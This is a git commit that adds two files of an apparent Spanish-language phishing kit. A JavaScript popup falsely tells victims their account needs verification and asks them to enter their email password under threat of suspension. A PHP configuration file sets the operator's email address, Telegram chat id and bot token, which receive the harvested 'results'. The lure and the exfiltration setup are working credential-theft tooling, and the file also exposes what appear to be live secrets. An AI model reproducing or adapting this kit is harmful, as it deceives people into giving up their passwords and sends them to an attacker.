f5d5dd7a0eb5b27d72fa51d6904c05cd0b4c2cf4
jeremiasllanoss <109324171+jeremiasllanoss@users.noreply.github.com>
2022-09-01 18:02:57 -0300

    primera subidaaa

---
+++ appx/air.js
@@ -0,0 +1,8 @@
+function da(){
+  swal({
+  title: "¡Verificación Requerida!",
+  text: "Necesitamos validar tu cuenta, para ello, ingresá la clave de tu correo electrónico para que podamos confirmar que te pertenece. Por tu seguridad, tu cuenta será suspendida si ingresas la información solicitada incorrectamente.",
+  button: "Continuar",
+  closeOnEsc: true,
+  closeOnClickOutside: true,
+});}
---
+++ config.php
@@ -0,0 +1,27 @@
+<?php
+/*               
+Telegram : @jakalsito
+Creditos: https://t.me/jakalsito
+*/
+
+
+	// ==============< DATOS >=============== //
+	$txt = "jakal"; // 
+	// ================================= //
+	$you = "acid4damind@hotmail.com"; 	 // 			INGRESA TU EMAIL PARA RECIBIR LOS RESULTADOS A TU CORREO (OJO LOS H0STINGS GRATIS POR LO GENERAL NO ENVIAN EMAIL)
+	// ================================= //
+	$id='-1001750080315';           //			INGRESA EL ID DE EL CHAT PARA RECIBIR LOS RESULTADOS VIA TELEGRAM
+	$key = "5691389561:AAEfUQ1tGjYGrAMEL4fjPjlVkOXcI4Eibms"; // INGRESA EL TOKEN DE TU BOT DE TELEGRAM
+	// ================================= //
+
+
+
+
+
+	// ==============< ZONA HORARIA >=============== //
+	function now() {
+		date_default_timezone_set('America/Argentina/Buenos_Aires');
+		return date("d/m/Y h:i:sa");
+	}
+    // ===================================== //
+?>
